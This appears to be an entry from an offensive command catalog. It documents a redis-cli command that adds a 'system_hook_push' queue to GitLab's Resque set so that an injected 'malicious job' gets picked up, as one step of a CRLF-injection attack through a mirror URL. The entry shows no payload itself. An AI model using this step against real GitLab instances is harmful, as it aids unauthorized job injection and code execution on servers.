---
id: cmd-redis-sadd-queue
data: 'sadd resque:gitlab:queues system_hook_push'
tags:
  - redis
  - queue
type: command
output: (integer) 1
executor: redis-cli
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:09:00.678Z'
verified: false
validated: true
submitted: true
---
---

# redis-sadd-queue

## Command

```bash
redis-cli -h 127.0.0.1 -p 6379 sadd resque:gitlab:queues system_hook_push
```

## Description

Adds the system_hook_push queue to GitLab's Resque set in Redis, ensuring the malicious job is recognized.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| resque:gitlab:queues | Key for queue set | Yes |
| system_hook_push | Member to add | Yes |

## Examples

### Basic Usage

```bash
redis-cli sadd resque:gitlab:queues system_hook_push
```

### Advanced Usage

Queued in transaction via CRLF payload.

## Expected Output

(integer) 1

## Related

- [[commands/redis-lpush-payload]]
- [[procedures/Inject-CRLF-Payload-in-Mirror-URL]]

